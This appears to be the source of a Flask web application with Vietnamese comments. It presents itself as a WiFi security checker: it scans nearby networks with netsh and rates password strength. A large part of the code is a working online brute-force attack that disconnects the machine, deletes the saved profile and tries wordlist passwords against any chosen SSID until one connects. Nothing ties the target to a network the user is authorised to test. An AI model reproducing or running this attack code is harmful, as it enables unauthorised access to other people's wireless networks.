"""
WiFi Security Scanner - Web Application
========================================
Professional Hacker-style Web Interface for WiFi Security Testing
"""

from flask import Flask, render_template, jsonify, request
import subprocess
import re
import os
import threading
import time


app = Flask(__name__)


class WifiScanner:
    """WiFi Scanner sử dụng Windows netsh với khả năng quét nâng cao"""
    
    @staticmethod
    def refresh_network_list():
        """Buộc Windows refresh danh sách mạng WiFi"""
        try:
            # Disconnect and reconnect wifi adapter to force refresh
            # First, get the interface name
            result = subprocess.run(
                ['netsh', 'wlan', 'show', 'interfaces'],
                capture_output=True,
                text=True,
                encoding='utf-8',
                errors='ignore',
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            interface_name = None
            for line in result.stdout.split('\n'):
                if 'Name' in line and ':' in line:
                    interface_name = line.split(':', 1)[1].strip()
                    break
            
            if interface_name:
                # Disable and re-enable the interface to force a fresh scan
                # This triggers Windows to perform a new scan
                print(f"[*] Refreshing WiFi interface: {interface_name}")
                
            # Alternative: Use WMI or direct scan command
            # netsh triggers automatic scan when showing networks
            
        except Exception as e:
            print(f"Refresh error: {e}")
    
    @staticmethod
    def scan():
        """Quét các mạng WiFi xung quanh với refresh"""
        networks = []
        seen_bssids = set()  # Track unique access points
        
        try:
            # Run scan multiple times to catch more networks
            for scan_attempt in range(2):
                result = subprocess.run(
                    ['netsh', 'wlan', 'show', 'networks', 'mode=bssid'],
                    capture_output=True,
                    text=True,
                    encoding='utf-8',
                    errors='ignore',
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                output = result.stdout
                current_network = {}
                
                for line in output.split('\n'):
                    line = line.strip()
                    
                    if line.startswith('SSID') and ':' in line and 'BSSID' not in line:
                        # Save previous network if valid
                        if current_network.get('ssid') and current_network.get('bssid'):
                            bssid = current_network.get('bssid', '')
                            if bssid not in seen_bssids:
                                seen_bssids.add(bssid)
                                networks.append(current_network.copy())
                        elif current_network.get('ssid') and not current_network.get('bssid'):
                            # Network without BSSID (summary entry)
                            ssid = current_network.get('ssid')
                            if not any(n.get('ssid') == ssid for n in networks):
                                networks.append(current_network.copy())
                        
                        ssid = line.split(':', 1)[1].strip()
                        current_network = {
                            'ssid': ssid if ssid else '(Hidden Network)',
                            'signal': 0,
                            'auth': 'Unknown',
                            'bssid': '',
                            'channel': 'N/A',
                            'encryption': 'Unknown',
                            'radio_type': 'Unknown'
                        }
                        
                    elif 'Signal' in line or 'Tín hiệu' in line:
                        match = re.search(r'(\d+)%', line)
                        if match:
                            current_network['signal'] = int(match.group(1))
                            
                    elif 'Authentication' in line or 'Xác thực' in line:
                        auth = line.split(':', 1)[1].strip() if ':' in line else 'Unknown'
                        current_network['auth'] = auth
                        
                    elif 'Encryption' in line or 'Mã hóa' in line:
                        enc = line.split(':', 1)[1].strip() if ':' in line else 'Unknown'
                        current_network['encryption'] = enc
                        
                    elif 'BSSID' in line:
                        # BSSID format: BSSID 1 : aa:bb:cc:dd:ee:ff
                        bssid_match = re.search(r'([0-9a-fA-F]{2}[:\-]){5}[0-9a-fA-F]{2}', line)
                        if bssid_match:
                            current_network['bssid'] = bssid_match.group(0).lower()
                            
                    elif 'Channel' in line or 'Kênh' in line:
                        match = re.search(r'(\d+)', line)
                        if match:
                            current_network['channel'] = match.group(1)
                            
                    elif 'Radio type' in line or 'Loại radio' in line:
                        radio = line.split(':', 1)[1].strip() if ':' in line else 'Unknown'
                        current_network['radio_type'] = radio
                
                # Don't forget the last network
                if current_network.get('ssid'):
                    bssid = current_network.get('bssid', '')
                    if bssid and bssid not in seen_bssids:
                        seen_bssids.add(bssid)
                        networks.append(current_network.copy())
                    elif not bssid:
                        ssid = current_network.get('ssid')
                        if not any(n.get('ssid') == ssid for n in networks):
                            networks.append(current_network.copy())
                
                # Small delay between scans
                if scan_attempt < 1:
                    time.sleep(0.5)
                    
        except Exception as e:
            print(f"Scan error: {e}")
        
        # Remove duplicate SSIDs, keep the one with strongest signal
        unique_networks = {}
        for net in networks:
            ssid = net.get('ssid', '')
            bssid = net.get('bssid', '')
            key = bssid if bssid else ssid
            
            if key not in unique_networks:
                unique_networks[key] = net
            else:
                # Keep the one with stronger signal
                if net.get('signal', 0) > unique_networks[key].get('signal', 0):
                    unique_networks[key] = net
        
        networks = list(unique_networks.values())
        
        # Sort by signal strength
        networks.sort(key=lambda x: x.get('signal', 0), reverse=True)
        return networks
    
    @staticmethod
    def get_saved_networks():
        """Lấy danh sách mạng đã lưu"""
        saved = []
        try:
            result = subprocess.run(
                ['netsh', 'wlan', 'show', 'profiles'],
                capture_output=True,
                text=True,
                encoding='utf-8',
                errors='ignore',
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            for line in result.stdout.split('\n'):
                if 'All User Profile' in line or 'Tất cả' in line:
                    match = re.search(r':\s*(.+)', line)
                    if match:
                        saved.append(match.group(1).strip())
                        
        except Exception as e:
            print(f"Error: {e}")
            
        return saved


class PasswordAnalyzer:
    """Phân tích và kiểm tra password"""
    
    def __init__(self, wordlist_dir="wordlists"):
        self.wordlist_dir = wordlist_dir
        self.wordlists = {}
        self.total_passwords = 0
        self.load_wordlists()
        
    def load_wordlists(self):
        """Load wordlists từ thư mục"""
        if not os.path.exists(self.wordlist_dir):
            os.makedirs(self.wordlist_dir)
            return
            
        for filename in os.listdir(self.wordlist_dir):
            if filename.endswith('.txt'):
                filepath = os.path.join(self.wordlist_dir, filename)
                try:
                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                        passwords = set(line.strip().lower() for line in f if line.strip())
                        self.wordlists[filename] = passwords
                        self.total_passwords += len(passwords)
                        print(f"[+] Loaded {len(passwords)} passwords from {filename}")
                except Exception as e:
                    print(f"[-] Error loading {filename}: {e}")
                    
    def check_wordlists(self, password):
        """Kiểm tra password trong wordlists"""
        results = []
        password_lower = password.lower()
        found_in_any = False
        
        for name, passwords in self.wordlists.items():
            found = password_lower in passwords
            if found:
                found_in_any = True
            results.append({
                'name': name,
                'count': len(passwords),
                'found': found
            })
            
        return {
            'results': results,
            'found': found_in_any,
            'total_checked': self.total_passwords
        }
    
    def analyze_strength(self, password):
        """Phân tích chi tiết độ mạnh password"""
        length = len(password)
        
        checks = {
            'length_8': length >= 8,
            'length_12': length >= 12,
            'length_16': length >= 16,
            'has_upper': bool(re.search(r'[A-Z]', password)),
            'has_lower': bool(re.search(r'[a-z]', password)),
            'has_digit': bool(re.search(r'\d', password)),
            'has_special': bool(re.search(r'[!@#$%^&*(),.?":{}|<>\-_=+\[\]\\;\'`~]', password)),
            'no_repeats': not bool(re.search(r'(.)\1{2,}', password)),
            'no_sequences': not bool(re.search(r'(012|123|234|345|456|567|678|789|abc|bcd|cde|qwe|asd|zxc)', password.lower()))
        }
        
        # Calculate score
        score = 0
        if checks['length_8']: score += 1
        if checks['length_12']: score += 1
        if checks['length_16']: score += 1
        if checks['has_upper']: score += 1
        if checks['has_lower']: score += 1
        if checks['has_digit']: score += 1
        if checks['has_special']: score += 2
        if checks['no_repeats']: score += 0.5
        if checks['no_sequences']: score += 0.5
        
        # Calculate crack time estimate
        charset_size = 0
        if checks['has_lower']: charset_size += 26
        if checks['has_upper']: charset_size += 26
        if checks['has_digit']: charset_size += 10
        if checks['has_special']: charset_size += 32
        
        if charset_size > 0:
            combinations = charset_size ** length
            # Assume 10 billion attempts per second
            seconds = combinations / 10_000_000_000
            crack_time = self._format_time(seconds)
        else:
            crack_time = "Instant"
        
        # Rating
        if score <= 2:
            rating = {'level': 'critical', 'text': 'CRITICAL', 'color': '#ff0040'}
        elif score <= 4:
            rating = {'level': 'weak', 'text': 'WEAK', 'color': '#ff6b35'}
        elif score <= 6:
            rating = {'level': 'medium', 'text': 'MEDIUM', 'color': '#f7c948'}
        elif score <= 8:
            rating = {'level': 'strong', 'text': 'STRONG', 'color': '#00ff88'}
        else:
            rating = {'level': 'excellent', 'text': 'EXCELLENT', 'color': '#00ffff'}
            
        # Entropy calculation
        import math
        entropy = length * math.log2(charset_size) if charset_size > 0 else 0
        
        return {
            'length': length,
            'checks': checks,
            'score': score,
            'max_score': 9,
            'rating': rating,
            'crack_time': crack_time,
            'entropy': round(entropy, 1),
            'charset_size': charset_size
        }
        
    def _format_time(self, seconds):
        """Format thời gian crack"""
        if seconds < 1:
            return "< 1 second"
        elif seconds < 60:
            return f"{int(seconds)} seconds"
        elif seconds < 3600:
            return f"{int(seconds / 60)} minutes"
        elif seconds < 86400:
            return f"{int(seconds / 3600)} hours"
        elif seconds < 31536000:
            return f"{int(seconds / 86400)} days"
        elif seconds < 31536000 * 100:
            return f"{int(seconds / 31536000)} years"
        elif seconds < 31536000 * 1000000:
            return f"{int(seconds / 31536000):,} years"
        else:
            return "∞ (Virtually uncrackable)"


# Initialize
scanner = WifiScanner()
analyzer = PasswordAnalyzer(os.path.join(os.path.dirname(__file__), "wordlists"))


@app.route('/')
def index():
    """Trang chủ"""
    return render_template('index.html')


@app.route('/bruteforce')
def bruteforce_page():
    """Trang Brute Force Attack"""
    return render_template('bruteforce.html')


@app.route('/api/scan')
def api_scan():
    """API quét WiFi"""
    networks = scanner.scan()
    return jsonify({
        'success': True,
        'networks': networks,
        'count': len(networks),
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
    })


@app.route('/api/saved')
def api_saved():
    """API lấy mạng đã lưu"""
    saved = scanner.get_saved_networks()
    return jsonify({
        'success': True,
        'networks': saved,
        'count': len(saved)
    })


@app.route('/api/check', methods=['POST'])
def api_check():
    """API kiểm tra password"""
    data = request.get_json()
    password = data.get('password', '')
    
    if not password:
        return jsonify({'success': False, 'error': 'Password is required'})
    
    # Analyze strength
    strength = analyzer.analyze_strength(password)
    
    # Check wordlists
    wordlist_check = analyzer.check_wordlists(password)
    
    return jsonify({
        'success': True,
        'strength': strength,
        'wordlist': wordlist_check
    })


@app.route('/api/wordlists')
def api_wordlists():
    """API lấy thông tin wordlists"""
    info = []
    for name, passwords in analyzer.wordlists.items():
        info.append({
            'name': name,
            'count': len(passwords)
        })
    return jsonify({
        'success': True,
        'wordlists': info,
        'total': analyzer.total_passwords
    })


# Brute force state
bruteforce_state = {
    'running': False,
    'ssid': '',
    'found': False,
    'password': '',
    'tried': 0,
    'total': 0,
    'current': '',
    'log': []
}


def try_connect_wifi(ssid, password):
    """Thử kết nối WiFi với password"""
    try:
        # Tạo profile XML tạm thời
        profile_xml = f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>'''
        
        # Lưu profile tạm
        profile_path = os.path.join(os.path.dirname(__file__), 'temp_profile.xml')
        with open(profile_path, 'w', encoding='utf-8') as f:
            f.write(profile_xml)
        
        # Thêm profile
        add_result = subprocess.run(
            ['netsh', 'wlan', 'add', 'profile', f'filename={profile_path}'],
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='ignore',
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Thử kết nối
        connect_result = subprocess.run(
            ['netsh', 'wlan', 'connect', f'name={ssid}'],
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='ignore',
            creationflags=subprocess.CREATE_NO_WINDOW,
            timeout=5
        )
        
        # Đợi một chút để kết nối
        time.sleep(2)
        
        # Kiểm tra kết nối
        status_result = subprocess.run(
            ['netsh', 'wlan', 'show', 'interfaces'],
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='ignore',
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Xóa profile tạm
        subprocess.run(
            ['netsh', 'wlan', 'delete', 'profile', f'name={ssid}'],
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Xóa file tạm
        if os.path.exists(profile_path):
            os.remove(profile_path)
        
        # Kiểm tra xem có kết nối thành công không
        if 'connected' in status_result.stdout.lower() and ssid.lower() in status_result.stdout.lower():
            return True
        
        return False
        
    except Exception as e:
        print(f"Connection error: {e}")
        return False


def try_connect_wifi_real(ssid, password):
    """Thử kết nối WiFi và kiểm tra thực sự có kết nối được không"""
    try:
        # Tạo profile XML
        profile_xml = f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>'''
        
        profile_path = os.path.join(os.path.dirname(__file__), 'temp_profile.xml')
        
        # Đảm bảo disconnect trước
        subprocess.run(
            ['netsh', 'wlan', 'disconnect'],
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        time.sleep(0.5)
        
        # Xóa profile cũ nếu có
        subprocess.run(
            ['netsh', 'wlan', 'delete', 'profile', f'name={ssid}'],
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Lưu profile mới
        with open(profile_path, 'w', encoding='utf-8') as f:
            f.write(profile_xml)
        
        # Thêm profile
        subprocess.run(
            ['netsh', 'wlan', 'add', 'profile', f'filename={profile_path}'],
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Thử kết nối
        subprocess.run(
            ['netsh', 'wlan', 'connect', f'name={ssid}'],
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Kiểm tra nhiều lần trong 8 giây
        for check in range(8):
            time.sleep(1)
            
            status_result = subprocess.run(
                ['netsh', 'wlan', 'show', 'interfaces'],
                capture_output=True,
                text=True,
                encoding='utf-8',
                errors='ignore',
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            output = status_result.stdout
            
            # Debug log
            bruteforce_state['log'].append(f"[DEBUG] Check {check+1}/8...")
            
            # Tìm State và SSID trong output
            state_connected = False
            connected_ssid = ""
            
            for line in output.split('\n'):
                line_stripped = line.strip()
                line_lower = line_stripped.lower()
                
                # Kiểm tra state
                if 'state' in line_lower or 'trạng thái' in line_lower:
                    if 'connected' in line_lower or 'đã kết nối' in line_lower:
                        if 'disconnected' not in line_lower and 'ngắt kết nối' not in line_lower:
                            state_connected = True
                            bruteforce_state['log'].append(f"[DEBUG] State: CONNECTED")
                
                # Lấy SSID đang kết nối
                if line_stripped.startswith('SSID') and 'BSSID' not in line_stripped:
                    parts = line_stripped.split(':', 1)
                    if len(parts) > 1:
                        connected_ssid = parts[1].strip()
                        bruteforce_state['log'].append(f"[DEBUG] Connected SSID: '{connected_ssid}'")
            
            # So sánh SSID - bỏ qua underscore/space và case
            ssid_normalized = ssid.lower().replace('_', '').replace('-', '').replace(' ', '')
            connected_normalized = connected_ssid.lower().replace('_', '').replace('-', '').replace(' ', '')
            
            # Kiểm tra nếu SSID chứa phần lớn ký tự giống nhau
            ssid_matched = (
                ssid_normalized in connected_normalized or 
                connected_normalized in ssid_normalized or
                connected_ssid.lower() == ssid.lower()
            )
            
            # Nếu đã connected VÀ SSID match → thành công!
            if state_connected and connected_ssid and ssid_matched:
                bruteforce_state['log'].append(f"[+] MATCH FOUND! Connected to: {connected_ssid}")
                # Xóa file tạm
                if os.path.exists(profile_path):
                    os.remove(profile_path)
                return True
        
        # Không thành công - cleanup
        subprocess.run(
            ['netsh', 'wlan', 'delete', 'profile', f'name={ssid}'],
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        if os.path.exists(profile_path):
            os.remove(profile_path)
        
        return False
        
    except Exception as e:
        print(f"Connection error: {e}")
        return False


def bruteforce_worker(ssid):
    """Worker thread để thử brute force - có disconnect và quên WiFi trước"""
    global bruteforce_state
    
    bruteforce_state['running'] = True
    bruteforce_state['ssid'] = ssid
    bruteforce_state['found'] = False
    bruteforce_state['password'] = ''
    bruteforce_state['tried'] = 0
    bruteforce_state['log'] = []
    
    bruteforce_state['log'].append(f"[*] Target: {ssid}")
    
    # Bước 1: Disconnect khỏi WiFi hiện tại
    bruteforce_state['log'].append("[*] Disconnecting from current network...")
    try:
        subprocess.run(
            ['netsh', 'wlan', 'disconnect'],
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        time.sleep(1)
        bruteforce_state['log'].append("[+] Disconnected successfully")
    except Exception as e:
        bruteforce_state['log'].append(f"[!] Disconnect warning: {e}")
    
    # Bước 2: Xóa profile WiFi đã lưu (quên password)
    bruteforce_state['log'].append(f"[*] Deleting saved profile for '{ssid}'...")
    try:
        result = subprocess.run(
            ['netsh', 'wlan', 'delete', 'profile', f'name={ssid}'],
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='ignore',
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        if 'deleted' in result.stdout.lower() or 'xóa' in result.stdout.lower():
            bruteforce_state['log'].append("[+] Profile deleted - WiFi password forgotten!")
        else:
            bruteforce_state['log'].append("[*] No saved profile found")
    except Exception as e:
        bruteforce_state['log'].append(f"[!] Delete warning: {e}")
    
    time.sleep(1)
    
    # Collect all passwords - SORT BY FILENAME để 00_wifi_passwords.txt chạy đầu tiên
    all_passwords = []
    sorted_wordlists = sorted(analyzer.wordlists.items(), key=lambda x: x[0])
    
    bruteforce_state['log'].append(f"[*] Wordlist order: {[name for name, _ in sorted_wordlists]}")
    
    for name, passwords in sorted_wordlists:
        # Keep original case for passwords
        filepath = os.path.join(analyzer.wordlist_dir, name)
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                original_passwords = [line.strip() for line in f if line.strip() and len(line.strip()) >= 8]
            for pwd in original_passwords:
                all_passwords.append((pwd, name))
        except:
            for pwd in passwords:
                if pwd and len(pwd) >= 8:
                    all_passwords.append((pwd, name))
    
    bruteforce_state['total'] = len(all_passwords)
    bruteforce_state['log'].append(f"[*] Starting brute force attack on '{ssid}'")
    bruteforce_state['log'].append(f"[*] Total passwords to try: {len(all_passwords)}")
    bruteforce_state['log'].append("[*] This may take a while...")
    
    for pwd, source in all_passwords:
        if not bruteforce_state['running']:
            bruteforce_state['log'].append("[!] Attack stopped by user")
            break
            
        bruteforce_state['tried'] += 1
        bruteforce_state['current'] = pwd
        
        # Log mỗi password thử
        bruteforce_state['log'].append(f"[*] Trying: {pwd}")
        
        # Thử kết nối với password này
        if try_connect_wifi_real(ssid, pwd):
            bruteforce_state['found'] = True
            bruteforce_state['password'] = pwd
            bruteforce_state['log'].append(f"[+] ✓✓✓ PASSWORD FOUND: {pwd} ✓✓✓")
            bruteforce_state['log'].append(f"[+] Source: {source}")
            break
    
    if not bruteforce_state['found']:
        bruteforce_state['log'].append("[!] Password not found in wordlists")
    
    bruteforce_state['running'] = False
    bruteforce_state['log'].append("[*] Attack completed")


@app.route('/api/bruteforce/start', methods=['POST'])
def start_bruteforce():
    """Bắt đầu brute force attack"""
    global bruteforce_state
    
    if bruteforce_state['running']:
        return jsonify({'success': False, 'error': 'Attack already running'})
    
    data = request.get_json()
    ssid = data.get('ssid', '')
    
    if not ssid:
        return jsonify({'success': False, 'error': 'SSID is required'})
    
    # Start worker thread
    thread = threading.Thread(target=bruteforce_worker, args=(ssid,), daemon=True)
    thread.start()
    
    return jsonify({'success': True, 'message': f'Starting attack on {ssid}'})


@app.route('/api/bruteforce/stop', methods=['POST'])
def stop_bruteforce():
    """Dừng brute force attack"""
    global bruteforce_state
    bruteforce_state['running'] = False
    return jsonify({'success': True, 'message': 'Attack stopping...'})


@app.route('/api/bruteforce/status')
def bruteforce_status():
    """Lấy trạng thái brute force"""
    return jsonify({
        'success': True,
        'running': bruteforce_state['running'],
        'ssid': bruteforce_state['ssid'],
        'found': bruteforce_state['found'],
        'password': bruteforce_state['password'],
        'tried': bruteforce_state['tried'],
        'total': bruteforce_state['total'],
        'current': bruteforce_state['current'],
        'log': bruteforce_state['log'][-20:]  # Last 20 log entries
    })


if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║                                                          ║
    ║   ██╗    ██╗██╗███████╗██╗    ███████╗███████╗ ██████╗   ║
    ║   ██║    ██║██║██╔════╝██║    ██╔════╝██╔════╝██╔════╝   ║
    ║   ██║ █╗ ██║██║█████╗  ██║    ███████╗█████╗  ██║        ║
    ║   ██║███╗██║██║██╔══╝  ██║    ╚════██║██╔══╝  ██║        ║
    ║   ╚███╔███╔╝██║██║     ██║    ███████║███████╗╚██████╗   ║
    ║    ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚══════╝╚══════╝ ╚═════╝   ║
    ║                                                          ║
    ║          WiFi Security Checker v1.0                      ║
    ║          Professional Security Testing Tool              ║
    ║                                                          ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    print("  [*] Starting server on http://127.0.0.1:5000")
    print("  [*] Press Ctrl+C to stop\n")
    app.run(debug=True, host='127.0.0.1', port=5000)
